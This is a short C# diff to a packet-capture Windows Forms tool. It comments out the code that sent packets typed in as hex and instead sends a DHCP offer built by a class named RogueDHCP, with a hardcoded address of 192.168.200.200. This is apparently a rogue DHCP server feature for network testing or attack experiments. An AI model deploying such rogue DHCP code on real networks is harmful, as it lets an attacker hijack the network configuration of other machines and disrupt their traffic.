@@ -51,6 +51,7 @@ namespace PacketCapture
 
         private void btnSend_Click(object sender, EventArgs e)
         {
+            /*
             string bytesToSend = "";
             //get Hex from the text
             foreach (string s in txtPacket.Lines)
@@ -68,9 +69,11 @@ namespace PacketCapture
                 packet[i] = Convert.ToByte(s, 16); 
                 i++;
             }
+             * */
             try
             {
-                FRMCapture.device.SendPacket(packet);
+                RogueDHCP.DHCP offer= RogueDHCP.DHCP.DHCPOffer(FRMCapture.localMAC.ToString(), FRMCapture.ConvertIpToHex(FRMCapture.localIp), "33553355", FRMCapture.ConvertIpToHex("192.168.200.200"), FRMCapture.localMAC.ToString(),FRMCapture.ConvertIpToHex(FRMCapture.subnet), FRMCapture.ConvertIpToHex(FRMCapture.gateway));
+                FRMCapture.device.SendPacket(offer.GetPacket());
             }
             catch(Exception ex)
             { MessageBox.Show(ex.Message); }
